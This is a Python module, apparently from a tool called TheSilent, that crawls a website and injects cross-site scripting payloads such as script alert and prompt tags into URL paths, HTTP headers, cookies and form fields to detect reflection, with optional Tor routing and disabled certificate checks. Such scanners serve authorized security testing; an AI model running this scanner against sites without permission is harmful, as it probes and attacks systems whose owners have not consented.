import re
import time
import urllib.parse
import requests
from TheSilent.clear import clear
from TheSilent.form_scanner import form_scanner
from TheSilent.link_scanner import link_scanner
from TheSilent.return_user_agent import return_user_agent

CYAN = "\033[1;36m"
RED = "\033[1;31m"

# create html sessions object
web_session = requests.Session()

tor_proxy = {
    "http": "socks5h://localhost:9050",
    "https": "socks5h://localhost:9050"}

# increased security
requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

# increased security
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

except AttributeError:
    pass

def return_mal_payloads():
    # malicious script

    init_mal_payloads = ["<div>the silent</div>", "<em>the silent</em>", "<iframe>the silent</iframe>", "<input type='text' id='thesilent' name='thesilent' value='thesilent'>", "<p>the silent</p>", "<script>alert('the silent')</script>", "<script>prompt('the silent')</script>", "<strong>the silent</strong>"]
    mal_payloads = init_mal_payloads[:]

    for mal in init_mal_payloads:
        mal_payloads.append("&" + mal + "&")
        mal_payloads.append("\\" + mal)
        mal_payloads.append("/./" + mal)
        mal_payloads.append("#" + mal)
        mal_payloads.append("\'\'\'" + mal + "\'\'\'")

    init_mal_payloads = mal_payloads[:]
    for mal in init_mal_payloads:
        mal_payloads.append(mal.upper())

    return mal_payloads

# scans for xss
def xss_scanner(url, secure=True, tor=False, crawl="0", my_file=" ", parse=" ", delay=1):
    mal_payloads = return_mal_payloads()
    mal_scripts = [
        "<div>the silent</div>",
        "<DIV>THE SILENT</DIV>",
        "<iframe>the silent</iframe>",
        "<IFRAME>THE SILENT</IFRAME>",
        "<input type='text' id='thesilent' name='thesilent' value='thesilent'>",
        "<INPUT TYPE='TEXT' ID='THESILENT' NAME='THESILENT' VALUE='THESILENT'>",
        "<p>the silent</p>",
        "<P>THE SILENT</P>",
        "<script>alert('the silent')</script>",
        "<SCRIPT>ALERT('THE SILENT')</SCRIPT>",
        "<script>prompt('the silent')</script>",
        "<SCRIPT>PROMPT('THE SILENT')</SCRIPT>",
        "<strong>the silent</strong>",
        "<STRONG>THE SILENT</STRONG>"]

    my_list = []

    clear()

    # crawl
    my_result = []

    if my_file == " ":
        my_result = link_scanner(url=url, secure=secure, tor=tor, crawl=crawl, parse=parse, delay=delay)

    if my_file != " ":
        with open(my_file, "r", errors="ignore") as file:
            for i in file:
                clean = i.replace("\n", "")
                my_result.append(clean)

    clear()

    for links in my_result:
        for mal_script in mal_payloads:
            try:
                if links.endswith("/"):
                    my_url = links + urllib.parse.quote(mal_script)

                else:
                    my_url = links + "/" + urllib.parse.quote(mal_script)

                print(CYAN + "checking: " + str(my_url))

                # prevent dos attacks
                time.sleep(delay)

                if tor:
                    result = web_session.get(my_url, verify=False, headers={"User-Agent": return_user_agent()}, proxies=tor_proxy, timeout=(60,120)).text

                else:
                    result = web_session.get(my_url, verify=False, headers={"User-Agent": return_user_agent()}, timeout=(5,30)).text

                for scripts in mal_scripts:
                    if scripts in result:
                        print(CYAN + "true: " + my_url)
                        my_list.append(my_url)
                        break

            except:
                print(RED + "ERROR! Connection Error! We may be IP banned or the server hasn't recovered! Waiting one minute before retrying!")
                time.sleep(60)

        client_headers = [
            "A-IM",
            "Accept",
            "Accept-Charset",
            "Accept-Datetime",
            "Accept-Encoding",
            "Accept-Language",
            "Access-Control-Request-Method",
            "Access-Control-Request-Headers",
            "Authorization",
            "Cache-Control",
            "Cookie",
            "Connection",
            "Content-Encoding",
            "Content-Length",
            "Content-MD5",
            "Content-Type",
            "Date",
            "Expect",
            "Forwarded",
            "From",
            "HTTP2-Settings",
            "If-Match",
            "If-Modified-Since",
            "If-None-Match",
            "If-Range",
            "If-Unmodified-Since",
            "Max-Forwards",
            "Origin",
            "Pragma",
            "Prefer",
            "Proxy-Authorization",
            "Range",
            "Referer",
            "TE",
            "Trailer",
            "Transfer-Encoding",
            "Via",
            "Warning"]

        for mal_script in mal_payloads:
            try:
                for http_header in client_headers:
                    user_agent_moded = {
                        "User-Agent": return_user_agent(),
                        http_header: mal_script}
                    print(CYAN + "checking: " + str(links) + " (headers) " + str(user_agent_moded))

                    # prevent dos attacks
                    time.sleep(delay)

                    if tor:
                        result = web_session.get(links, verify=False, headers=user_agent_moded, proxies=tor_proxy, timeout=(60,120)).text

                    else:
                        result = web_session.get(links, verify=False, headers=user_agent_moded, timeout=(5,30)).text

                    for scripts in mal_scripts:
                        if scripts in result:
                            print(CYAN + "true: " + str(links) + " (headers) " + str(user_agent_moded))
                            my_list.append(str(links) + " (headers) " + str(user_agent_moded))
                            break

            except:
                print(RED + "ERROR! Connection Error! We may be IP banned or the server hasn't recovered! Waiting one minute before retrying!")
                time.sleep(60)

        for mal_script in mal_payloads:
            try:
                mal_cookie = {mal_script: mal_script}
                print(CYAN + "checking: " + str(links) + " (cookies) " + str(mal_cookie))

                # prevent dos attacks
                time.sleep(delay)

                if tor:
                    result = web_session.get(links, verify=False, headers={"User-Agent": return_user_agent()}, cookies=mal_cookie, proxies=tor_proxy, timeout=(60,120)).text

                else:
                    result = web_session.get(links, verify=False, headers={"User-Agent": return_user_agent()}, cookies=mal_cookie, timeout=(5,30)).text

                for scripts in mal_scripts:
                    if scripts in result:
                        print(CYAN + "true: " + links + " (cookie) " + scripts)
                        my_list.append(links + " (cookie) " + scripts)
                        break

            except:
                print(RED + "ERROR! Connection Error! We may be IP banned or the server hasn't recovered! Waiting one minute before retrying!")
                time.sleep(60)

        time.sleep(delay)
        print(CYAN + "checking for forms on: " + links)
        clean = links.replace("http://", "")
        clean = clean.replace("https://", "")

        form_input = form_scanner(clean, secure=secure, tor=tor, parse="input")
        form_activities = form_scanner(clean, secure=secure, tor=tor)

        for activity in form_activities:
            for i in form_input:
                try:
                    time.sleep(delay)
                    for mal_script in mal_payloads:
                        name = re.findall("name=\"(\\S+)\"", i)
                        mal_dict = {name[0]: mal_script}

                        if name[0] in activity:
                            action = re.findall("action=\"(\\S+)\"", activity)
                            method = re.findall("method=\"(\\S+)\"", activity)

                            try:
                                if action[0] != "":
                                    if links.endswith("/") and url not in action[0]:
                                        my_link = links + action[0]

                                    elif not links.endswith("/") and url not in action[0]:
                                        my_link = links + "/" + action[0]

                                    else:
                                        my_link = links

                            except IndexError:
                                my_link = links

                            print(CYAN + "checking: " + str(my_link) + " " + str(mal_dict))

                            # prevent dos attacks
                            time.sleep(delay)

                            if tor:
                                if method[0].lower() == "get":
                                    get = web_session.get(my_link, params=mal_dict, verify=False, headers={"User-Agent": return_user_agent()}, proxies=tor_proxy, timeout=(60,120)).text
                                    for scripts in mal_scripts:
                                        if scripts in get:
                                            print(CYAN + "true: " + str(my_link) + " {" + str(name[0]) + ":" + scripts + "}")
                                            my_list.append(str(my_link) + " {" + str(name[0]) + ":" + scripts + "}")
                                            break

                                if method[0].lower() == "post":
                                    post = web_session.post(my_link, data=mal_dict, verify=False, headers={"User-Agent": return_user_agent()}, proxies=tor_proxy, timeout=(60,120)).text
                                    for scripts in mal_scripts:
                                        if scripts in post:
                                            print(CYAN + "true: " + str(my_link) + " {" + str(name[0]) + ":" + scripts + "}")
                                            my_list.append(str(my_link) + " {" + str(name[0]) + ":" + scripts + "}")
                                            break

                            else:
                                if method[0].lower() == "get":
                                    get = web_session.get(my_link, params=mal_dict, verify=False, headers={"User-Agent": return_user_agent()}, timeout=(5,30)).text

                                    for scripts in mal_scripts:
                                        if scripts in get:
                                            print(CYAN + "true: " + str(my_link) + " {" + str(name[0]) + ":" + scripts + "}")
                                            my_list.append(str(my_link) + " {" + str(name[0]) + ":" + scripts + "}")
                                            break

                                if method[0].lower() == "post":
                                    post = web_session.post(my_link, data=mal_dict, verify=False, headers={"User-Agent": return_user_agent()}, timeout=(5,30)).text

                                    for scripts in mal_scripts:
                                        if scripts in post:
                                            print(CYAN + "true: " + str(my_link) + " {" + str(name[0]) + ":" + scripts + "}")
                                            my_list.append(str(my_link) + " {" + str(name[0]) + ":" + scripts + "}")
                                            break

                except:
                    print(RED + "ERROR! Connection Error! We may be IP banned or the server hasn't recovered! Waiting one minute before retrying!")
                    time.sleep(60)

    print(CYAN + "")
    clear()

    my_list = sorted(set(my_list))

    return my_list
